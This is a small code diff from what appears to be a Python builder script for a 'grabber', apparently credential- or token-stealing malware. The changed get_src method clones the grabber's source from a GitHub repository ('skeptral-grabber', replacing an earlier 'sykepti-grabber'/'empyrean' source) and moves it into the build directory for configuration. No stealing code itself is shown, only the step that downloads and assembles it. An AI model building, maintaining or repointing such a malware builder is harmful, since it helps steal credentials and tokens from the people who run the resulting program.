@@ -70,8 +70,8 @@ class make_env:
         os.mkdir(self.build_dir)
 
     def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/Sykeptical/sykepti-grabber.git'], cwd=self.build_dir)
-        shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
+        subprocess.run(['git', 'clone', 'https://github.com/SkeptralHIDDENLFML1/skeptral-grabber.git'], cwd=self.build_dir)
+        shutil.move(os.path.join(self.build_dir, 'skeptral-grabber', 'src'), self.build_dir)
 
 class write_config:
     def __init__(self, config: dict) -> None:
